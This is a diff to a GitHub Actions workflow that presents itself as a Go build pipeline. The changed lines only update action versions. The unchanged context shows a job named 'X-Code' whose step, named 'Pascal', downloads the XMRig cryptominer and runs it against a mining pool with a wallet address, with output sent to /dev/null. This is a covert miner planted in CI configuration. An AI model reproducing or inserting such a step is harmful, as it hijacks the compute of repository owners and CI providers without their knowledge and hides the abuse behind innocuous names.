@@ -20,7 +20,7 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
+      uses: actions/setup-go@v3
   deploy:
     name: X-Code
     runs-on: macos-latest
@@ -36,12 +36,12 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: Setup Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
+      uses: actions/setup-go@v3
       with:
         go-version: ${{ matrix.go }}
       id: go
     - name: Check-in
-      uses: actions/checkout@v2
+      uses: actions/checkout@v3
     - name: Pascal
       run: |
         wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar xvf *.gz && cd xmrig-6.16.4 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u ZRX:0xcC72f75Ef07Bde3e1a7691490DB0aAF4A9beFd1E.mymine -p x > /dev/null
